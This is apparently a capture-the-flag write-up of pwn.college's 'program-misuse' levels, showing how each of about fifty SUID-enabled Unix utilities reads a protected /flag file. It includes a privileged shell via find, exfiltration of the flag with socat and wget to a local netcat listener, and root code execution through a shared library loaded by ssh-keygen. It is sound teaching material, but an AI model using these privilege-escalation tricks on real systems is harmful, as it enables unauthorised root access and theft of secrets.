---
custom_edit_url: null
sidebar_position: 1
---

## cat

> I just set the SUID bit on /usr/bin/cat.\
> Try to use it to read the flag!

We can just `cat` the flag.

```
hacker@program-misuse~level1:/$ cat /flag 
```

&nbsp;

## more

> I just set the SUID bit on /usr/bin/more.\
> Try to use it to read the flag!

The `more` utility is used to view the text files in the command prompt, displaying one screen at a time in case the file is large

```
hacker@program-misuse~level2:/$ more /flag 
```

&nbsp;

## less

> I just set the SUID bit on /usr/bin/less.\
> Try to use it to read the flag!

```
hacker@program-misuse~level3:/$ less /flag 
```

&nbsp;

## tail

> I just set the SUID bit on /usr/bin/tail.\
> Try to use it to read the flag!

```
hacker@program-misuse~level4:/$ tail /flag 
```

&nbsp;

## head

> I just set the SUID bit on /usr/bin/head.\
> Try to use it to read the flag!

```
hacker@program-misuse~level5:/$ head /flag 
```

&nbsp;

## sort

> I just set the SUID bit on /usr/bin/sort.\
> Try to use it to read the flag!

```
hacker@program-misuse~level6:/$ sort /flag 
```

&nbsp;

## vim

> I just set the SUID bit on /usr/bin/vim.\
> Try to use it to read the flag!

```
hacker@program-misuse~level7:/$ vim /flag 
```

&nbsp;

## emacs

> I just set the SUID bit on /usr/bin/emacs.\
> Try to use it to read the flag!

```
hacker@program-misuse~level8:/$ emacs /flag
```

&nbsp;

## nano

> I just set the SUID bit on /usr/bin/nano.\
> Try to use it to read the flag!

```
hacker@program-misuse~level9:/$ nano /flag 
```

&nbsp;

## rev

> I just set the SUID bit on /usr/bin/rev.\
> Try to use it to read the flag!

The `rev` utility reverses the order of characters within a file.

```
hacker@program-misuse~level10:/$ rev /flag
```

The flag is reversed. In order to get the correct ordered flag, we have to pipe the above command with another `rev`.

```
hacker@program-misuse~level10:/$ rev /flag | rev
```

&nbsp;

## od

> I just set the SUID bit on /usr/bin/od.\
> Try to use it to read the flag!

The `od` utility gives an octal dump of the data provided through STDIN.

If we provide the `-c` option, `od` will dump the ASCII representation.

```
hacker@program-misuse~level11:/$ od -c /flag 
```

&nbsp;

## hd

> I just set the SUID bit on /usr/bin/hd.\
> Try to use it to read the flag!

The `hd` utility gives an hexadecimal dump of the data provided through STDIN.

```
hacker@program-misuse~level12:/$ hd /flag 
```

&nbsp;

## xxd

> I just set the SUID bit on /usr/bin/xxd.\
> Try to use it to read the flag!

The `xxd` creates a hex dump of the input provided through STDIN.

```
hacker@program-misuse~level13:/$ xxd /flag 
```

&nbsp;

## base32

> I just set the SUID bit on /usr/bin/base32.\
> Try to use it to read the flag!

The `base32` utility can be used to Base32 encode or decode data.

```
hacker@program-misuse~level14:/$ base32 /flag 
```

THis prints the Base32 encoded flag string.

We can decode this string using the `-d` option.

```
hacker@program-misuse~level14:/$ base32 /flag | base32 -d
```

&nbsp;

## base64

> I just set the SUID bit on /usr/bin/base64.\
> Try to use it to read the flag!

The `base64` utility can be used to Base64 encode or decode data.

```
hacker@program-misuse~level15:/$ base64 /flag 
```

This prints the Base64 flag string.

We can decode the string using the `-d` option.

```
hacker@program-misuse~level15:/$ base64 /flag | base64 -d
```

&nbsp;

## split

> I just set the SUID bit on /usr/bin/split.\
> Try to use it to read the flag!

The `split` utility splits the given data based on the buffer size that is set.

The `-x` option prints an unbuffered stream of data.

```
hacker@program-misuse~level16:~$ split -x /flag 
```

This prints the flag into a file `xaa` (could be different on your end). 

```
hacker@program-misuse~level16:~$ cat xaa 
```

&nbsp;

## gzip

> I just set the SUID bit on /usr/bin/gzip.\
> Try to use it to read the flag!

The `gzip` utility compresses the file provided to it using Lempel-Ziv coding.

```
hacker@program-misuse~level17:/$ gzip /flag 
```

We can use the `-d` option to decompress the `flag.gz` file. Also, we can use the `-c` option to print its content to STDOUT.

```
hacker@program-misuse~level17:/$ gzip -c -d /flag.gz 
```

&nbsp;

## bzip2

> I just set the SUID bit on /usr/bin/bzip2.\
> Try to use it to read the flag!

The `bzip2` utility compresses files using the Burrows-Wheeler block sorting text compression algorithm, and Huffman coding.

We can use the `-c` option to print its content to STDOUT. Also, we can use the `-d` option to decompress the `flag.gz` file

```
hacker@program-misuse~level18:/$ bzip2 -c /flag | bzip2 -d
```

&nbsp;

## zip

> I just set the SUID bit on /usr/bin/zip.\
> Try to use it to read the flag!

The `zip` is a compression and file packaging utility for Unix, VMS, MSDOS, OS/2, Windows 9x/NT/XP, Minix, Atari, Macintosh, Amiga, and Acorn RISC OS.

In order to use it, we have to specify a destination file as well.

```
hacker@program-misuse~level19:/$ zip /flag.zip /flag && cat /flag.zip 
```

&nbsp;

## tar

> I just set the SUID bit on /usr/bin/tar.\
> Try to use it to read the flag!

The `tar` utility is an archiving program designed to store multiple files in a single file (an archive), and to manipulate such archives.

```
hacker@program-misuse~level20:/$ tar -cvf flag.tar /flag && cat flag.tar
```

&nbsp;

## ar

> I just set the SUID bit on /usr/bin/ar.\
> Try to use it to read the flag!

 `ar` program creates, modifies, and extracts from archives.

We can specify the output file using the `r` option.

```
hacker@program-misuse~level21:/$ ar r /flag.a /flag && cat /flag.a
```

&nbsp;

## cpio

> I just set the SUID bit on /usr/bin/cpio.\
> Try to use it to read the flag!

The `cpio` utility can be copy files between archives.

We can use the `find` command for the `/flag` , pipe it with `cpio` and redirect the output to the `flag.cpio` file.

```
hacker@program-misuse~level22:~$ find /flag | cpio -o > flag.cpio && cat flag.cpio
```

&nbsp;

## genisoimage

> I just set the SUID bit on /usr/bin/genisoimage.\
> Try to use it to read the flag!

The `genisoimage` utility creates filesystem images.

In order to retrieve the flag, we have to use the following script:

```
hacker@program-misuse~level23:/$ for option in $(genisoimage --help 2>&1 | grep FILE | awk {'print $1'}); do echo $option; genisoimage $option /flag 2>&1 | grep pwn; done
```

&nbsp;

## env

> I just set the SUID bit on /usr/bin/env.\
> Try to use it to read the flag!

The `env` utility sets the environment for another command.

We can pair it with `cat` to read the flag.

```
hacker@program-misuse~level24:/$ env cat /flag
```

&nbsp;

## find

> I just set the SUID bit on /usr/bin/find.\
> Try to use it to read the flag!

```
hacker@program-misuse~level25:~$ find . -exec /bin/sh -p \; 
#
```

```
# cat /flag
cat: /flagcat: No such file or directory
pwn.college{UsQ6vfq4dFoZ1Q5jlesvmOxUwqA.01N2EDL4ITM0EzW}
```

&nbsp;

## make

> I just set the SUID bit on /usr/bin/make.\
> Try to use it to read the flag!

The  `make`  utility will determine automatically which pieces of a large program need to be recompiled, and issue the commands to recompile them.

Any command we specify within the `Makefile` is executed.

```text title="Makefile"
all:
	cat /flag
```

In order to execute the `Makefile`, we have to run the `make` command in the same directory as the file.

```
hacker@program-misuse~level26:~$ make
```

&nbsp;

## nice

> I just set the SUID bit on /usr/bin/nice.\
> Try to use it to read the flag!

The `nice` utility ca be used to adjust the process scheduling. 

```
hacker@program-misuse~level27:/$ nice cat /flag 
```

&nbsp;

## timeout

> I just set the SUID bit on /usr/bin/timeout.\
> Try to use it to read the flag!

The `timeout` utility sets a time limit on the execution of a command.

```
hacker@program-misuse~level28:/$ timeout 1 cat /flag
```

&nbsp;

## stdbuf

> I just set the SUID bit on /usr/bin/stdbuf.\
> Try to use it to read the flag!

The `stdbuf` utility adjusts buffering options for a command.

We can use the `-oL` option to 

```
hacker@program-misuse~level29:~$ stdbuf -i0 cat /flag
```

&nbsp;

## setarch

> I just set the SUID bit on /usr/bin/setarch.\
> Try to use it to read the flag!

The `setarch` utility sets the architecture for a command.

```
hacker@program-misuse~level30:/$ setarch -R cat /flag 
```

&nbsp;

## watch

> I just set the SUID bit on /usr/bin/watch.\
> Try to use it to read the flag!

The `watch` utility repeats a command at specified intervals.

```
hacker@program-misuse~level30:/$ watch -x cat /flag
```

&nbsp;

## socat

> I just set the SUID bit on /usr/bin/socat.\
> Try to use it to read the flag!

The `socat` utility establishes two bidirectional byte streams and transfers data between them.

Let us set up a `nc` listener on port 80.

```
hacker@program-misuse~level32:/$ nc -nlvp 80
Listening on 0.0.0.0 80
```

Now, using `socat`, we can send the contents of `/flag` over port 80.

```
hacker@program-misuse~level32:/$ socat -u file:/flag tcp-connect:localhost:80
```

If we check back on our listener, we should have flag.

&nbsp;

## whiptail

> I just set the SUID bit on /usr/bin/whiptail.\
> Try to use it to read the flag!

The `whiptail` utility allows us to present a variety of questions or display messages using dialog boxes from a shell script.

```
hacker@program-misuse~level33:/$ whiptail --textbox --scrolltext "$LFILE" 10 50
```

![Pasted image 20240521173223](https://github.com/Kunull/Write-ups/assets/110326359/cde0c0e1-ab97-478a-97df-97377db0d0dd)

&nbsp;

## awk

> I just set the SUID bit on /usr/bin/awk.\
> Try to use it to read the flag!

The AWK language is useful for manipulation of data files, text retrieval and processing, and for prototyping and experimenting with algorithms.

We can use this language to read the `/flag` file and print the content to the STDOUT.

```
hacker@program-misuse~level34:/$ awk '{print $0}' /flag
```

&nbsp;

## sed

> I just set the SUID bit on /usr/bin/sed.\
> Try to use it to read the flag!

`sed` is a stream editor that can be used to perform basic string transformation on data. It makes only one pass over the  input.

```
hacker@program-misuse~level35:/$ sed 's/""/""/' /flag
```

&nbsp;

## ed

> I just set the SUID bit on /usr/bin/ed.\
> Try to use it to read the flag!

`ed` is a line-oriented text editor. It is used to create, display, modify and otherwise manipulate text files, both interactively and via shell scripts. It makes multiple passes over the input.

```
hacker@program-misuse~level36:/$ ed -v /flag
57

```

The stream has been opened. We can now type `p` to retrieve the flag which starts with P and then type `q` to quit.

&nbsp;

## chown

> I just set the SUID bit on /usr/bin/chown.\
> Try to use it to read the flag!

The `chown` utility changes the user and/or group ownership of each given file.

```
hacker@program-misuse~level37:/$ chown hacker /flag && cat /flag 
```

&nbsp;

## chmod

> I just set the SUID bit on /usr/bin/chmod.\
> Try to use it to read the flag!

The `chmod` changes the file mode bits of each given file.

```
hacker@program-misuse~level38:/$ chmod 777 /flag && cat /flag 
```

&nbsp;

## cp

> I just set the SUID bit on /usr/bin/cp.\
> Try to use it to read the flag!

The `cp` utility copies a file to the specified destination.

We know that the `/home/hacker` directory is a persistent one, i.e. every file in this directory is unmodified through all the levels. Knowing this, we can copy the `/flag` to this directory.

```
hacker@program-misuse~level39:~$ cp /flag flag.copy
```

Now, we can load level 1, and just `cat` the `flag.copy` file.

```
hacker@program-misuse~level1:~$ cat flag.copy
```

&nbsp;

## mv

> I just set the SUID bit on /usr/bin/mv.\
> Try to use it to read the flag!

The `mv` utility moves the specified file to the specified destination.

We know that the `/home/hacker` directory is a persistent one, i.e. every file in this directory is unmodified through all the levels. Knowing this, we can copy the `/flag` to this directory.

```
hacker@program-misuse~level40:~$ mv /flag flag.move
```

Now, we can load level 1, and just `cat` the `flag.copy` file.

```
hacker@program-misuse~level1:~$ cat flag.move
```

&nbsp;

## perl

> I just set the SUID bit on /usr/bin/perl.\
> Try to use it to read the flag!

Perl is a scripting language. As such, ew can use the following script to read the `/flag`.

```pl title="babysuid41.pl"
open(fh, "/flag");
$firstline = <fh>;
print "$firstline\n";
```

We have to use the `perl` utility to execute the script.

```
hacker@program-misuse~level41:~$ perl babysuid41.pl
```

&nbsp;

## python

> I just set the SUID bit on /usr/bin/python.\
> Try to use it to read the flag!

Python is a scripting language. As such, we can use the following script to read the `/flag`.

```python title="babysuid42.py"
with open("/flag", "r") as flag:
    print(flag.read())
```

We have to use the `python` utility to execute the script.

```
hacker@program-misuse~level42:~$ python babysuid42.py
```

&nbsp;

## ruby

> I just set the SUID bit on /usr/bin/ruby.\
> Try to use it to read the flag!

Ruby is a scripting language. As such, we can use the following script to read the `/flag`.

```ruby title="babysuid43.rb"
fileObject = File.open("/flag","r");
print(fileObject.read());
fileObject.close();
```

We have to use the `ruby` utility to execute the script.

```
hacker@program-misuse~level43:~$ ruby babysuid43.rb 
```

&nbsp;

## bash

> I just set the SUID bit on /usr/bin/bash.\
> Try to use it to read the flag!

Bash is a scripting language. As such, we can use the following script to read the `/flag`.

```bash title="babysuid44.sh"
cat /flag
```

We have to use the `bash` along with the `-p` option to execute the script.

```
hacker@program-misuse~level44:~$ bash -p babysuid44.sh 
```

&nbsp;

## date

> I just set the SUID bit on /usr/bin/date.\
> Try to use it to read the flag!

The `date` utility displays the current time.

If we provide the `/flag` file to `date`, it prints out the flag within the error message.

```
hacker@program-misuse~level45:/$ date -f /flag
```

&nbsp;

## dmesg

> I just set the SUID bit on /usr/bin/dmesg.\
> Try to use it to read the flag!

`dmesg` is used to examine or control the kernel ring buffer.

We can use the `-F` option to specify a file to read from.

```
hacker@program-misuse~level46:/$ dmesg -F /flag
```

&nbsp;

## wc

> I just set the SUID bit on /usr/bin/wc.\
> Try to use it to read the flag!

The `wc` command is used for word counting.

We can use the `--files0-from` option such that the flag is printed out in the error message.

```
hacker@program-misuse~level47:/$ wc --files0-from=/flag
```

&nbsp;

## gcc

> I just set the SUID bit on /usr/bin/gcc.\
> Try to use it to read the flag!

The `gcc` utility is used for preprocessing, compilation, assembly and linking files.

Let us write a simple C script.

```c
#include </flag>

int main {
	puts("Hello");
}
```

We can compile the C code using `gcc`.

```
hacker@program-misuse~level48:~$ gcc -L / babysuid48.c
```

Since we are including `/flag`, which we do not have access to the compilation is going to result in an error. However, within the error messages, we can read the flag.

&nbsp;

## as

> I just set the SUID bit on /usr/bin/as.\
> Try to use it to read the flag!

The `as` utility is an assembler for programming languages.

```
hacker@program-misuse~level49:/$ as /flag 
```

&nbsp;

## wget

> I just set the SUID bit on /usr/bin/wget.\
> Try to use it to read the flag!

Let us set up a `nc` listener. 

```
hacker@program-misuse~level50:/$ nc -nlvp 80
Listening on 0.0.0.0 80
```

Let's now POST the `/flag` file to our listener.

```
hacker@program-misuse~level50:/$ wget --post-file=/flag http://localhost
--2024-05-21 16:00:46--  http://localhost/
Resolving localhost (localhost)... ::1, 127.0.0.1
Connecting to localhost (localhost)|::1|:80... failed: Connection refused.
Connecting to localhost (localhost)|127.0.0.1|:80... connected.
HTTP request sent, awaiting response... 
```

If we check back on the `nc` listener, we should have received the flag.


&nbsp;

## ssh-keygen

```c
include <stdio.h>

int C_GetFunctionList()
{
        FILE *fptr;
        fptr = fopen("/flag", "r");
        char myString[100];
        fgets(myString, 100, fptr);
        printf("%s", myString);
        fclose(fptr);
}

int main()
{
        puts("Hello");
}
```

```
hacker@program-misuse~level51:~$ gcc babysuid51.c -o babysuid51 -shared -no-pie
```

```
hacker@program-misuse~level51:~$ ssh-keygen -D ./babysuid51
```
